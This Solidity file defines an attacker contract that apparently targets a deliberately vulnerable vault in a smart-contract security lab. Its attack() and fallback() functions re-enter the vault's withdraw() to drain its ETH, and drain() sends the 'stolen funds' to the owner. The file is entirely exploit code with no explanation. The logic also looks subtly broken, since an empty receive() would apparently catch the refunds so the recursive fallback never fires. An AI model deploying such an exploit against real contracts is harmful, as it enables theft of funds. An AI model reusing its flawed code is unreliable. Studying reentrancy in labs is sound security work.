// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ReentrancyVulnerableVault.sol";

contract Attacker {
    ReentrancyVulnerableVault public vault;
    address public owner;

    constructor(address _vaultAddress) {
        vault = ReentrancyVulnerableVault(_vaultAddress);
        owner = msg.sender;
    }

    // Start attack by depositing and withdrawing
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    // fallback gets triggered when ETH is received
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether); // keep withdrawing recursively
        }
    }

    // Withdraw stolen funds
    function drain() external {
        require(msg.sender == owner, "Not your funds");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
